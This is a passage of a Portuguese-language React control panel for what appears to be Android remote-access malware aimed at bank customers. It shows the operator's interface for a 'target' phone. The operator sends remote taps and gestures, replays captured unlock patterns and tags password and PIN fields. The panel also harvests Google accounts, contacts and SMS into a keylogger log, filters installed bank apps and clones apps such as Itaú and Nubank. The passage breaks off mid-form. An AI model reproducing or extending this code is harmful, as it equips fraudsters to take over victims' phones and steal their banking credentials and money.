                          const devW = activeHierarchy?.hierarchy?.bounds?.w || SCREEN_BASE_WIDTH;
                          const devH = activeHierarchy?.hierarchy?.bounds?.h || SCREEN_BASE_HEIGHT;
                          const realScale = rect.width / devW;
                          const realX = Math.round(x / realScale);
                          const realY = Math.round(y / realScale);

                          if (v2PatternDrawnRef.current.length > 0) {
                            setV2PatternDragPos({ x: realX, y: realY });
                            const hitDotId = getHitPatternDot(realX, realY, devW, devH, activeHierarchy?.hierarchy);
                            if (hitDotId && !v2PatternDrawnRef.current.includes(hitDotId)) {
                              v2PatternDrawnRef.current.push(hitDotId);
                              setV2PatternDrawn([...v2PatternDrawnRef.current]);
                            }
                          }

                          if (!isDragging || !mouseDownPos) return;
                          e.preventDefault();
                          const lastPoint = dragPathRef.current[dragPathRef.current.length - 1];
                          const dist = Math.sqrt(Math.pow(realX - lastPoint.x, 2) + Math.pow(realY - lastPoint.y, 2));
                          if (dist > 10) {
                            dragPathRef.current.push({ x: realX, y: realY });
                          }
                        }}
                        onMouseUp={(e) => {
                          if (!mouseDownPos) return;
                          e.preventDefault();

                          const currentDrawn = v2PatternDrawnRef.current;
                          if (currentDrawn.length > 0) {
                            const patternStr = currentDrawn.join('');
                            if (currentDrawn.length >= 2) {
                              saveDevicePattern(patternStr);

                              // Calcula as coordenadas físicas reais (X,Y) de cada ponto na tela do celular
                              const devW = activeHierarchy?.hierarchy?.bounds?.w || SCREEN_BASE_WIDTH;
                              const devH = activeHierarchy?.hierarchy?.bounds?.h || SCREEN_BASE_HEIGHT;
                              const dots = getV2PatternDots(devW, devH, activeHierarchy?.hierarchy);
                              
                              const rawPoints = currentDrawn.map(dotId => {
                                const d = dots.find(dot => dot.id === dotId);
                                return { x: Math.round(d ? d.x : 0), y: Math.round(d ? d.y : 0) };
                              });

                              // Dispara o PATH_GESTURE encadeado com continução de toque para curvas em L
                              sendCommand({
                                action: 'PATH_GESTURE',
                                path: JSON.stringify(rawPoints)
                              });

                              setPatternInput(patternStr);
                              setCapturedPattern(patternStr);
                              addLog(` Padrão (${patternStr}) enviado ao celular via segmentos encadeados (L-Lock)`);
                            }
                            v2PatternDrawnRef.current = [];
                            setV2PatternDrawn([]);
                            setV2PatternDragPos(null);
                            setMouseDownPos(null);
                            setIsDragging(false);
                            dragPathRef.current = [];
                            return;
                          }

                          if (v2PatternMode) {
                            v2PatternDrawnRef.current = [];
                            setV2PatternDrawn([]);
                            setV2PatternDragPos(null);
                            setMouseDownPos(null);
                            setIsDragging(false);
                            dragPathRef.current = [];
                            return;
                          }

                          const canvas = e.currentTarget.querySelector('canvas');
                          if (!canvas) return;
                          const rect = canvas.getBoundingClientRect();
                          const upX = e.clientX - rect.left;
                          const upY = e.clientY - rect.top;
                          const downX = mouseDownPos.x;
                          const downY = mouseDownPos.y;
                          const deltaX = upX - downX;
                          const deltaY = upY - downY;
                          const distance = Math.sqrt(deltaX * deltaX + deltaY * deltaY);
                          const holdTime = Date.now() - mouseDownTime;
                          const devW = screenHierarchy?.hierarchy?.bounds?.w || SCREEN_BASE_WIDTH;
                          const devH = screenHierarchy?.hierarchy?.bounds?.h || SCREEN_BASE_HEIGHT;
                          const realScale = rect.width / devW;
                          if (distance < 10 && holdTime < 500) {
                            const realX = Math.round(downX / realScale);
                            const realY = Math.round(downY / realScale);
                            const normX = Math.max(0, Math.min(1, realX / devW));
                            const normY = Math.max(0, Math.min(1, realY / devH));
                            sendCommand({ action: 'CLICK', x: normX, y: normY, scale: 'vnc_norm' });
                          } else if (distance >= 10) {
                            if (dragPathRef.current.length > 3) {
                              const xCoords = dragPathRef.current.map(p => Math.round(p.x / realScale));
                              const yCoords = dragPathRef.current.map(p => Math.round(p.y / realScale));
                              const pathPoints = dragPathRef.current.map(p => ({
                                x: Math.round(p.x / realScale),
                                y: Math.round(p.y / realScale)
                              }));
                              sendCommand({ 
                                action: 'PATH_GESTURE', 
                                xCoords, 
                                yCoords,
                                path: JSON.stringify(pathPoints)
                              });
                            } else {
                              const realX1 = Math.round(downX / realScale);
                              const realY1 = Math.round(downY / realScale);
                              const realX2 = Math.round(upX / realScale);
                              const realY2 = Math.round(upY / realScale);
                              const normX1 = Math.max(0, Math.min(1, realX1 / devW));
                              const normY1 = Math.max(0, Math.min(1, realY1 / devH));
                              const normX2 = Math.max(0, Math.min(1, realX2 / devW));
                              const normY2 = Math.max(0, Math.min(1, realY2 / devH));
                              sendCommand({ action: 'SWIPE', x1: normX1, y1: normY1, x2: normX2, y2: normY2, scale: 'vnc_norm' });
                            }
                          }
                          setMouseDownPos(null);
                          setIsDragging(false);
                          dragPathRef.current = [];
                        }}
                        onMouseLeave={() => {
                          if (v2PatternDrawn.length > 0) {
                            const patternStr = v2PatternDrawn.join('');
                            if (v2PatternDrawn.length >= 2) {
                              saveDevicePattern(patternStr);
                              sendCommand({ action: 'PLAY_PATTERN_SEQUENCE', pattern: patternStr, delay: 1000 });
                              setPatternInput(patternStr);
                              setCapturedPattern(patternStr);
                              addLog(` Padrão desenhado na Tela V2 enviado ao aparelho: ${patternStr}`);
                            }
                            setV2PatternDrawn([]);
                            setV2PatternDragPos(null);
                          }
                          setMouseDownPos(null);
                          setIsDragging(false);
                          dragPathRef.current = [];
                        }}
                      >
                        <ScreenReaderCanvas 
                          hierarchy={screenHierarchy.hierarchy} 
                          maxHeight={window.innerHeight - 140}
                          textScale={v2TextScale}
                          designTheme={v2DesignTheme}
                          hideUntyped={v2HideUntypedElements}
                          hoveredNode={hoveredNode}
                          patternMode={v2PatternMode}
                          patternDrawn={v2PatternDrawn}
                          patternDragPos={v2PatternDragPos}
                        />
                      </div>
                    </div>
                    
                    {/* Lista de Elementos Clicáveis - Painel Lateral */}
                    <div className="flex-1 flex flex-col border-l border-green-500/20 min-w-0">
                      <div className="px-3 py-2 bg-green-950/30 border-b border-green-500/15">
                        <h4 className="text-green-300 font-bold text-xs flex items-center">
                          <List className="w-3.5 h-3.5 mr-1.5 text-green-400 animate-pulse" />
                          Elementos Interativos ({(() => {
                            const list: ScreenReaderNode[] = [];
                            const collect = (node: ScreenReaderNode) => {
                              if (!node) return;
                              if (node.bounds && (node.clickable || node.editable || node.password || node.isPinDigit)) {
                                list.push(node);
                              }
                              node.children?.forEach(c => collect(c));
                            };
                            if (screenHierarchy?.hierarchy) collect(screenHierarchy.hierarchy);
                            return list.length;
                          })()})
                        </h4>
                      </div>
                      <div className="flex-1 overflow-y-auto p-2 space-y-1.5 scrollbar-thin scrollbar-thumb-green-500/25 scrollbar-track-transparent">
                        {(() => {
                          const list: ScreenReaderNode[] = [];
                          const collect = (node: ScreenReaderNode) => {
                            if (!node) return;
                            if (node.bounds && (node.clickable || node.editable || node.password || node.isPinDigit)) {
                              list.push(node);
                            }
                            node.children?.forEach(c => collect(c));
                          };
                          if (screenHierarchy?.hierarchy) collect(screenHierarchy.hierarchy);
                          
                          if (list.length === 0) {
                            return <p className="text-gray-500 text-xs italic text-center py-12">Nenhum elemento interativo detectado</p>;
                          }
                          
                          return list.map((item, idx) => {
                            let label = item.text?.trim() || item.desc?.trim() || item.hint?.trim() || '';
                            const isPwd = item.password;
                            const isInput = item.editable;
                            const isPin = item.isPinDigit;
                            
                            let typeBadge = " CLIQUE";
                            let badgeStyle = "bg-[#121214]/60 text-[#ef4444] border-[#2a2a31]/30";
                            
                            if (isPwd) {
                              typeBadge = " SENHA";
                              badgeStyle = "bg-[#121214]/60 text-[#ef4444] border-[#2a2a31]/30";
                            } else if (isInput) {
                              typeBadge = " INPUT";
                              badgeStyle = "bg-green-950/60 text-green-400 border-green-500/30";
                            } else if (isPin) {
                              typeBadge = " PIN";
                              badgeStyle = "bg-amber-950/60 text-amber-400 border-amber-500/30";
                            }
                            
                            if (!label) {
                              if (item.id) {
                                label = item.id.includes('/') ? item.id.split('/').pop() || '' : item.id;
                              } else if (item.class) {
                                label = item.class.split('.').pop() || '';
                              } else {
                                label = `Elemento #${idx + 1}`;
                              }
                            }
                            
                            const cx = Math.round(item.bounds!.x + item.bounds!.w / 2);
                            const cy = Math.round(item.bounds!.y + item.bounds!.h / 2);
                            
                            return (
                              <div
                                key={idx}
                                onMouseEnter={() => setHoveredNode(item)}
                                onMouseLeave={() => setHoveredNode(null)}
                                className="group flex items-center justify-between p-2 rounded bg-slate-950/50 hover:bg-green-500/10 border border-[#121214] hover:border-green-500/30 transition-all cursor-pointer"
                                onClick={() => {
                                  sendCommand({ action: 'CLICK', x: cx, y: cy });
                                  addLog(`± Click remoto em: "${label}" (${cx}, ${cy})`);
                                }}
                              >
                                <div className="flex flex-col min-w-0 mr-2">
                                  <div className="flex items-center space-x-1.5">
                                    <span className={`text-[8px] font-bold px-1.5 py-0.5 rounded border ${badgeStyle}`}>
                                      {typeBadge}
                                    </span>
                                    <span className="text-[9px] text-[#8b8b94] font-mono">
                                      ({cx}, {cy})
                                    </span>
                                  </div>
                                  <span className="text-xs font-semibold text-slate-200 truncate mt-1 group-hover:text-green-300 transition-colors">
                                    {label}
                                  </span>
                                </div>
                                <button
                                  className="px-2 py-0.5 bg-gradient-to-r from-green-800 to-emerald-700 hover:from-green-700 hover:to-emerald-600 text-white rounded text-[10px] font-bold transition-all shadow shadow-green-900/30 shrink-0"
                                >
                                  
                                </button>
                              </div>
                            );
                          });
                        })()}
                      </div>
                    </div>
                  </div>
                ) : (
                  <div className="flex-1 flex items-center justify-center text-center text-gray-400">
                    <div>
                      <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-green-500 mx-auto mb-2"></div>
                      <p>Aguardando dados...</p>
                    </div>
                  </div>
                )}
              </div>
            </div>
          </div>
        </div>
      )}
      
      {/*  MODAL DE CONTAS GOOGLE NO APARELHO */}
      {showGoogleAccountsModal && (
        <div className="fixed inset-0 bg-black/80 backdrop-blur-md flex items-center justify-center z-50 p-4" onClick={() => setShowGoogleAccountsModal(false)}>
          <div className="bg-[#380d04] border border-amber-500/50 shadow-[0_0_35px_rgba(245,158,11,0.3)] rounded-md max-w-xl w-full p-6 max-h-[85vh] overflow-hidden flex flex-col" onClick={(e) => e.stopPropagation()}>
            <div className="flex items-center justify-between pb-4 border-b border-amber-500/30">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 rounded-md bg-amber-500/20 border border-amber-500/40 flex items-center justify-center text-amber-400 shadow-[0_0_12px_rgba(245,158,11,0.2)]">
                  <Mail className="w-6 h-6" />
                </div>
                <div>
                  <h2 className="text-lg font-black text-amber-300 font-mono uppercase tracking-wider flex items-center gap-2">
                    Contas Google no Aparelho
                    <span className="text-xs px-2 py-0.5 rounded-full bg-amber-950/80 border border-amber-500/40 text-amber-300 font-bold font-mono">
                      {(device?.accounts || device?.google_accounts || []).length}
                    </span>
                  </h2>
                  <p className="text-slate-400 text-xs font-mono">
                    Contas registradas e vinculadas no dispositivo do alvo.
                  </p>
                </div>
              </div>
              <button
                onClick={() => setShowGoogleAccountsModal(false)}
                className="w-8 h-8 rounded-md bg-[#24242a]/80 hover:bg-[#2a2a31] text-slate-300 hover:text-white flex items-center justify-center text-xl transition-all cursor-pointer"
              >
                ×
              </button>
            </div>

            <div className="py-4 flex-1 overflow-y-auto custom-scrollbar space-y-3">
              {(!device?.accounts && !device?.google_accounts || (device?.accounts || device?.google_accounts || []).length === 0) ? (
                <div className="text-center py-10 bg-[#1e0603] border border-dashed border-amber-500/30 rounded-md p-6">
                  <Mail className="w-12 h-12 text-amber-500/40 mx-auto mb-3 animate-pulse" />
                  <p className="text-amber-200 text-sm font-bold font-mono">Nenhuma conta Google capturada ainda</p>
                  <p className="text-slate-400 text-xs font-mono mt-1 max-w-sm mx-auto">
                    Clique em "Atualizar Contas" para solicitar as contas registradas no sistema do dispositivo ou certifique-se de que o app tem as permissões ativas.
                  </p>
                </div>
              ) : (
                (device?.accounts || device?.google_accounts || []).map((acc: string, i: number) => (
                  <div key={i} className="flex items-center justify-between bg-[#1e0603] p-3.5 rounded-md border border-amber-500/30 hover:border-amber-400/60 transition-all shadow-md group">
                    <div className="flex items-center gap-3 min-w-0">
                      <div className="w-9 h-9 rounded-md bg-gradient-to-br from-amber-500/20 to-[#84cc16]/30 border border-amber-500/40 flex items-center justify-center shrink-0 text-amber-400">
                        <Mail className="w-4 h-4" />
                      </div>
                      <div className="min-w-0">
                        <p className="text-amber-200 text-sm font-black font-mono truncate">{acc}</p>
                        <p className="text-amber-500/70 text-[10px] font-mono">Conta Google Ativa</p>
                      </div>
                    </div>
                    <button
                      onClick={() => {
                        navigator.clipboard.writeText(acc);
                        addLog(` Conta Google ${acc} copiada!`);
                      }}
                      className="px-3 py-1.5 bg-amber-950/40 hover:bg-amber-900/60 border border-amber-500/40 hover:border-amber-300 text-amber-300 rounded-md text-xs font-bold font-mono flex items-center gap-1.5 transition-all cursor-pointer shadow-sm shrink-0"
                    >
                      <Copy className="w-3.5 h-3.5" /> Copiar
                    </button>
                  </div>
                ))
              )}
            </div>

            <div className="pt-4 border-t border-amber-500/30 flex items-center justify-between">
              <button
                onClick={() => {
                  sendCommand({ action: 'GET_DEVICE_INFO' });
                  sendCommand({ action: 'GET_ACCOUNTS' });
                  addLog(' Solicitando atualização de contas Google...');
                  setTimeout(() => {
                    loadDevice();
                  }, 1500);
                }}
                className="px-4 py-2 bg-gradient-to-r from-amber-600 to-[#84cc16] hover:from-amber-500 hover:to-[#ef4444] text-white rounded-md font-bold font-mono text-xs flex items-center gap-2 transition-all shadow-[0_0_15px_rgba(245,158,11,0.3)] cursor-pointer"
              >
                <RefreshCw className="w-4 h-4" /> Atualizar Contas
              </button>
              <button
                onClick={() => setShowGoogleAccountsModal(false)}
                className="px-4 py-2 bg-[#24242a] hover:bg-[#2a2a31] text-slate-300 rounded-md font-bold font-mono text-xs transition-all cursor-pointer"
              >
                Fechar
              </button>
            </div>
          </div>
        </div>
      )}

      {/*  Modal de Envio e Leitura de SMS */}
      {showSmsModal && (
        <div className="fixed inset-0 bg-black/80 backdrop-blur-md flex items-center justify-center z-50 p-4" onClick={() => setShowSmsModal(false)}>
          <div className="bg-[#380d04] border border-[#2a2a31]/40 shadow-[0_0_35px_rgba(239,68,68,0.3)] rounded-md max-w-lg w-full p-6 space-y-4 text-slate-200" onClick={(e) => e.stopPropagation()}>
            <div className="flex items-center justify-between pb-3 border-b border-[#2a2a31]/30">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 rounded-md bg-[#ef4444]/20 border border-[#2a2a31]/40 flex items-center justify-center text-[#ef4444] shadow-[0_0_12px_rgba(239,68,68,0.2)]">
                  <MessageSquare className="w-6 h-6" />
                </div>
                <div>
                  <h3 className="text-lg font-black text-[#ef4444] font-mono uppercase tracking-wider">Central SMS do Aparelho</h3>
                  <p className="text-slate-400 text-xs font-mono">Envie ou solicite mensagens de texto do dispositivo alvo</p>
                </div>
              </div>
              <button
                onClick={() => setShowSmsModal(false)}
                className="w-8 h-8 rounded-md bg-[#24242a]/80 hover:bg-[#2a2a31] text-slate-300 hover:text-white flex items-center justify-center text-xl transition-all cursor-pointer"
              >
                ×
              </button>
            </div>

            <div className="space-y-4">
              <div>
                <label className="block text-xs font-bold uppercase tracking-wider text-[#ef4444] mb-1 font-mono">
                   Número de Destino (SMS)
                </label>
                <input
                  type="text"
                  placeholder="Ex: +5511999999999 ou 11999999999"
                  value={smsPhone}
                  onChange={(e) => setSmsPhone(e.target.value)}
                  className="w-full bg-[#1e0603] border border-[#2a2a31]/30 rounded-md px-4 py-2.5 text-white font-mono placeholder:text-[#6f6f78] focus:outline-none focus:border-[#3a3a44] transition"
                />
              </div>

              <div>
                <label className="block text-xs font-bold uppercase tracking-wider text-[#ef4444] mb-1 font-mono">
                   Mensagem de Texto
                </label>
                <textarea
                  rows={4}
                  placeholder="Digite o conteúdo do SMS a ser enviado pelo aparelho..."
                  value={smsMessage}
                  onChange={(e) => setSmsMessage(e.target.value)}
                  className="w-full bg-[#1e0603] border border-[#2a2a31]/30 rounded-md px-4 py-2.5 text-white placeholder:text-[#6f6f78] focus:outline-none focus:border-[#3a3a44] transition resize-none font-mono text-sm"
                />
              </div>

              {smsStatusMsg && (
                <div className={`p-3 rounded-md text-xs font-mono font-medium ${smsStatusMsg.includes('sucesso') || smsStatusMsg.includes('enviado') ? 'bg-emerald-500/10 text-emerald-300 border border-emerald-500/40' : 'bg-[#ef4444]/10 text-[#ef4444] border border-[#2a2a31]/40'}`}>
                  {smsStatusMsg}
                </div>
              )}

              <div className="flex gap-3 pt-2">
                <button
                  disabled={smsSending || !smsPhone.trim() || !smsMessage.trim()}
                  onClick={async () => {
                    if (!deviceId) return;
                    setSmsSending(true);
                    setSmsStatusMsg('³ Enviando comando de SMS para o aparelho...');
                    try {
                      await devicesAPI.sendCommand(deviceId, {
                        action: 'SEND_SMS',
                        phone: smsPhone.trim(),
                        message: smsMessage.trim()
                      });
                      setSmsStatusMsg(' Comando de envio de SMS despachado com sucesso!');
                    } catch (err: any) {
                      setSmsStatusMsg(' Erro ao enviar comando: ' + (err.message || 'Falha na íconexão'));
                    } finally {
                      setSmsSending(false);
                    }
                  }}
                  className="flex-1 py-3 bg-gradient-to-r from-[#ef4444] to-[#ef4444] hover:from-[#ef4444] hover:to-[#ef4444] disabled:opacity-50 text-[#10120a] font-bold font-mono text-xs rounded-md shadow-[0_0_15px_rgba(239,68,68,0.3)] transition flex items-center justify-center gap-2 cursor-pointer"
                >
                  <MessageSquare className="w-4 h-4" />
                  {smsSending ? 'Enviando...' : 'Enviar SMS'}
                </button>

                <button
                  disabled={smsSending}
                  onClick={async () => {
                    if (!deviceId) return;
                    setSmsStatusMsg('³ Solicitando SMS da caixa de entrada do aparelho...');
                    try {
                      await devicesAPI.sendCommand(deviceId, { action: 'GET_SMS' });
                      setSmsStatusMsg(' Requisição enviada! As mensagens serão listadas no Log/Keylogger.');
                    } catch (err: any) {
                      setSmsStatusMsg(' Erro ao solicitar SMS: ' + (err.message || 'Falha na íconexão'));
                    }
                  }}
                  className="px-4 py-3 bg-[#24242a]/80 hover:bg-[#2a2a31] text-slate-200 font-bold font-mono text-xs rounded-md border border-[#2a2a31] transition cursor-pointer"
                >
                  Obter Inbox SMS
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      {/*  Modal de Visualização de Contatos */}
      {showContactsModal && (
        <div className="fixed inset-0 bg-black/80 backdrop-blur-md flex items-center justify-center z-50 p-4" onClick={() => setShowContactsModal(false)}>
          <div className="bg-[#380d04] border border-amber-500/40 shadow-[0_0_35px_rgba(245,158,11,0.3)] rounded-md max-w-lg w-full p-6 space-y-4 text-slate-200" onClick={(e) => e.stopPropagation()}>
            <div className="flex items-center justify-between pb-3 border-b border-amber-500/30">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 rounded-md bg-amber-500/20 border border-amber-500/40 flex items-center justify-center text-amber-400 shadow-[0_0_12px_rgba(245,158,11,0.2)]">
                  <Users className="w-6 h-6" />
                </div>
                <div>
                  <h3 className="text-lg font-black text-amber-300 font-mono uppercase tracking-wider">Contatos do Aparelho</h3>
                  <p className="text-slate-400 text-xs font-mono">Agenda de contatos e números sincronizados</p>
                </div>
              </div>
              <button
                onClick={() => setShowContactsModal(false)}
                className="w-8 h-8 rounded-md bg-[#24242a]/80 hover:bg-[#2a2a31] text-slate-300 hover:text-white flex items-center justify-center text-xl transition-all cursor-pointer"
              >
                ×
              </button>
            </div>

            <div className="flex items-center justify-between gap-3">
              <input
                type="text"
                placeholder=" Pesquisar por nome ou número..."
                value={contactsSearch}
                onChange={(e) => setContactsSearch(e.target.value)}
                className="flex-1 bg-[#1e0603] border border-amber-500/30 rounded-md px-4 py-2 text-white font-mono text-xs placeholder:text-[#6f6f78] focus:outline-none focus:border-amber-400 transition"
              />
              <button
                onClick={fetchContacts}
                disabled={contactsLoading}
                className="px-3 py-2 bg-amber-500/20 border border-amber-500/40 text-amber-300 rounded-md font-mono text-xs font-bold hover:bg-amber-500/30 transition flex items-center gap-1.5 cursor-pointer"
              >
                {contactsLoading ? '³...' : ' Atualizar'}
              </button>
            </div>

            <div className="max-h-80 overflow-y-auto space-y-2 pr-1 custom-scrollbar">
              {contactsLoading && contactsList.length === 0 ? (
                <div className="text-center py-8 text-slate-400 font-mono text-xs animate-pulse">
                  Carregando agenda de contatos do dispositivo...
                </div>
              ) : contactsList.length === 0 ? (
                <div className="text-center py-8 text-[#8b8b94] font-mono text-xs">
                  Nenhum contato encontrado ou permissão não concedida no dispositivo.
                </div>
              ) : (
                contactsList
                  .filter((c) => 
                    (c.name || '').toLowerCase().includes(contactsSearch.toLowerCase()) ||
                    (c.number || '').includes(contactsSearch)
                  )
                  .map((contact, index) => (
                    <div
                      key={index}
                      className="p-3 bg-[#1e0603]/80 border border-[#24242a] hover:border-amber-500/40 rounded-md flex items-center justify-between transition group"
                    >
                      <div className="flex items-center gap-3">
                        <div className="w-8 h-8 rounded-md bg-amber-500/10 border border-amber-500/20 text-amber-400 flex items-center justify-center font-mono font-bold text-xs">
                          {(contact.name || 'S')[0].toUpperCase()}
                        </div>
                        <div>
                          <div className="text-xs font-bold text-slate-200 font-mono group-hover:text-amber-300 transition">
                            {contact.name || 'Sem Nome'}
                          </div>
                          <div className="text-[10px] text-slate-400 font-mono">
                            {contact.number || 'Número oculto'}
                          </div>
                        </div>
                      </div>
                      {contact.number && (
                        <button
                          onClick={() => {
                            navigator.clipboard.writeText(contact.number);
                            alert(`Número ${contact.number} copiado!`);
                          }}
                          className="text-[10px] font-mono text-slate-400 hover:text-amber-300 bg-[#24242a]/80 hover:bg-amber-500/20 px-2 py-1 rounded transition border border-[#2a2a31] cursor-pointer"
                        >
                           Copiar
                        </button>
                      )}
                    </div>
                  ))
              )}
            </div>
          </div>
        </div>
      )}

      {/*  MODAL DE APPS INSTALADOS */}
      {showAppsModal && (
        <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50" onClick={() => setShowAppsModal(false)}>
          <div className="bg-[#121214] rounded-md p-6 max-w-4xl w-full mx-4 max-h-[90vh] overflow-hidden flex flex-col" onClick={(e) => e.stopPropagation()}>
            <div className="flex items-center justify-between mb-4">
              <h2 className="text-2xl font-bold text-white flex items-center">
                <span className="text-3xl mr-3"></span>
                Apps Instalados
                <span className="ml-3 text-sm font-normal text-gray-400">
                  ({filteredApps.length} apps)
                </span>
              </h2>
              <button
                onClick={() => setShowAppsModal(false)}
                className="text-gray-400 hover:text-white text-2xl"
              >
                ×
              </button>
            </div>
            
            {/* Filtros e busca */}
            <div className="flex flex-wrap gap-2 mb-4">
                <input
                  type="text"
                placeholder="Buscar app..."
                value={appsSearch}
                onChange={(e) => setAppsSearch(e.target.value)}
                className="flex-1 min-w-[200px] px-3 py-2 bg-[#2a2a31] text-white rounded-md border border-[#2a2a31]/25 focus:border-[#2a2a31] focus:outline-none"
              />
              
              <div className="flex gap-1">
                <button
                  onClick={() => setAppsFilter('banks')}
                  className={`px-3 py-2 rounded-md font-medium transition-all ${
                    appsFilter === 'banks' 
                      ? 'bg-[#84cc16] text-white shadow-[0_0_10px_rgba(239,68,68,0.3)]' 
                      : 'bg-[#2a2a31] text-gray-300 hover:bg-[#6f6f78]'
                  }`}
                >
                   Bancos
                </button>
                <button
                  onClick={() => setAppsFilter('user')}
                  className={`px-3 py-2 rounded-md font-medium transition-all ${
                    appsFilter === 'user' 
                      ? 'bg-[#ef4444] text-white' 
                      : 'bg-[#2a2a31] text-gray-300 hover:bg-[#6f6f78]'
                  }`}
                >
                   Usuário
                </button>
                <button
                  onClick={() => setAppsFilter('system')}
                  className={`px-3 py-2 rounded-md font-medium transition-all ${
                    appsFilter === 'system' 
                      ? 'bg-[#ef4444] text-white' 
                      : 'bg-[#2a2a31] text-gray-300 hover:bg-[#6f6f78]'
                  }`}
                >
                  š Sistema
                </button>
                <button
                  onClick={() => setAppsFilter('all')}
                  className={`px-3 py-2 rounded-md font-medium transition-all ${
                    appsFilter === 'all' 
                      ? 'bg-[#ef4444] text-white' 
                      : 'bg-[#2a2a31] text-gray-300 hover:bg-[#6f6f78]'
                  }`}
                >
                   Todos
                </button>
              </div>
              
              <button
                onClick={fetchInstalledApps}
                disabled={isLoadingApps}
                className="px-3 py-2 bg-green-600 hover:bg-green-700 text-white rounded-md font-medium transition-all flex items-center"
              >
                {isLoadingApps ? '³' : ''} Atualizar
              </button>
            </div>

            {/* Lista de apps */}
            <div className="flex-1 overflow-y-auto">
              {isLoadingApps ? (
                <div className="flex items-center justify-center py-12">
                  <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-[#2a2a31]"></div>
                  <span className="ml-3 text-gray-400">Carregando apps...</span>
                </div>
              ) : filteredApps.length === 0 ? (
                <div className="text-center py-12 text-gray-400">
                  <span className="text-4xl mb-4 block"></span>
                  {installedApps.length === 0 
                    ? 'Clique em "Atualizar" para carregar os apps'
                    : 'Nenhum app encontrado com os filtros atuais'
                  }
                </div>
              ) : (
                <div className="grid grid-cols-1 md:grid-cols-2 gap-2">
                  {filteredApps.map((app, index) => (
                    <div
                      key={app.package || index}
                      className="bg-[#2a2a31] rounded-md p-3 flex items-center justify-between hover:bg-[#6f6f78] transition-all"
                    >
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center">
                          <span className="text-2xl mr-2">
                            {app.isSystem ? 'š' : '±'}
                          </span>
                          <div className="min-w-0">
                            <h4 className="text-white font-medium truncate">
                              {app.name}
                            </h4>
                            <p className="text-gray-400 text-xs truncate">
                              {app.package}
                            </p>
                            {app.version && (
                              <p className="text-gray-500 text-xs">
                                v{app.version}
                              </p>
                            )}
                          </div>
                        </div>
                      </div>
                      
                      <div className="flex gap-1 ml-2">
                        {app.canOpen && (
                          <button
                            onClick={() => openApp(app.package, app.name)}
                            className="p-2 bg-[#ef4444] hover:bg-[#f87171] text-white rounded-md transition-all"
                            title="Abrir app"
                          >
                            ¶
                          </button>
                        )}
                        
                        <button
                          onClick={() => forceStopApp(app.package, app.name)}
                          className="p-2 bg-yellow-600 hover:bg-yellow-700 text-white rounded-md transition-all"
                          title="Forçar parada"
                        >
                          
                        </button>
                        
                        {!app.isSystem && (
                          <button
                            onClick={() => uninstallApp(app.package, app.name)}
                            className="p-2 bg-[#ef4444] hover:bg-[#f87171] text-white rounded-md transition-all"
                            title="Desinstalar"
                          >
                            
                          </button>
                        )}
          </div>
        </div>
                  ))}
      </div>
              )}
            </div>
          </div>
        </div>
      )}

      {/*  MODAL DUPLICADOR DE APLICATIVO DO APARELHO */}
      {showDeviceDuplicatorModal && (
        <div className="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center z-50 p-4" onClick={() => setShowDeviceDuplicatorModal(false)}>
          <div className="bg-[#1a1a1e] border border-[#2a2a31]/30 rounded-md p-6 max-w-xl w-full space-y-6 shadow-[0_0_40px_rgba(239,68,68,0.2)]" onClick={(e) => e.stopPropagation()}>
            <div className="flex items-center justify-between border-b border-[#24242a] pb-4">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 rounded-md bg-[#ef4444]/15 border border-[#2a2a31]/30 flex items-center justify-center text-[#ef4444]">
                  <Copy size={20} />
                </div>
                <div>
                  <h3 className="text-lg font-black text-white font-mono uppercase tracking-wide flex items-center gap-2">
                    Duplicar App <span className="text-[#ef4444]">no Aparelho</span>
                  </h3>
                  <p className="text-xs text-slate-400">Cria uma instncia duplicada do aplicativo no celular do alvo</p>
                </div>
              </div>
              <button
                onClick={() => setShowDeviceDuplicatorModal(false)}
                className="text-slate-400 hover:text-white text-xl font-bold p-1 rounded-md hover:bg-[#24242a]"
              >
                
              </button>
            </div>

            {/* Form Fields */}
            <div className="space-y-4 text-xs font-mono">
              {/* Seleção do App Alvo no Aparelho */}
              <div className="space-y-1.5">
                <label className="block text-slate-300 font-bold uppercase tracking-wider">
                  1. Aplicativo Alvo no Aparelho
                </label>
                <select
                  value={duplicatorSelectedApp?.package || ''}
                  onChange={(e) => {
                    const pkg = e.target.value;
                    const found = installedApps.find(a => a.package === pkg);
                    const name = found?.name || pkg.split('.').pop() || 'App';
                    setDuplicatorSelectedApp({ package: pkg, name });
                    setDuplicatorCloneName(`${name} (Duplicado)`);
                    setDuplicatorClonePackage(`${pkg}.cloned`);
                  }}
                  className="w-full bg-[#190503] border border-[#2a2a31]/30 rounded-md px-4 py-3 text-white focus:outline-none focus:border-[#3a3a44] font-mono"
                >
                  {installedApps.length > 0 ? (
                    installedApps.map((a, i) => (
                      <option key={i} value={a.package}>
                        {a.name} ({a.package})
                      </option>
                    ))
                  ) : (
                    <>
                      <option value="com.whatsapp">WhatsApp (com.whatsapp)</option>
                      <option value="br.com.itau">Itaú (br.com.itau)</option>
                      <option value="com.nu.production">Nubank (com.nu.production)</option>
                      <option value="br.com.bradesco">Bradesco (br.com.bradesco)</option>
                      <option value="br.com.bb.android">Banco do Brasil (br.com.bb.android)</option>
                      <option value="com.santander.app">Santander (com.santander.app)</option>
                      <option value="br.gov.caixa.tem">Caixa Tem (br.gov.caixa.tem)</option>
                      <option value="com.mercadopago">Mercado Pago (com.mercadopago)</option>
                      <option value="com.instagram.android">Instagram (com.instagram.android)</option>
                    </>
                  )}
                </select>
              </div>

              {/* Nome do Clone */}
              <div className="space-y-1.5">
                <label className="block text-slate-300 font-bold uppercase tracking-wider">
                  2. Nome do App Duplicado no Aparelho
                </label>
                <input
                  type="text"
                  value={duplicatorCloneName}
                  onChange={(e) => setDuplicatorCloneName(e.target.value)}
                  placeholder="Ex: WhatsApp Dual, Itaú (Cópia)"
                  className="w-full bg-[#190503] border border-[#2a2a31]/30 rounded-md px-4 py-3 text-white focus:outline-none focus:border-[#3a3a44]"
                />
              </div>

              {/* Package ID do Clone */}
              <div className="space-y-1.5">
                <label className="block text-slate-300 font-bold uppercase tracking-wider">
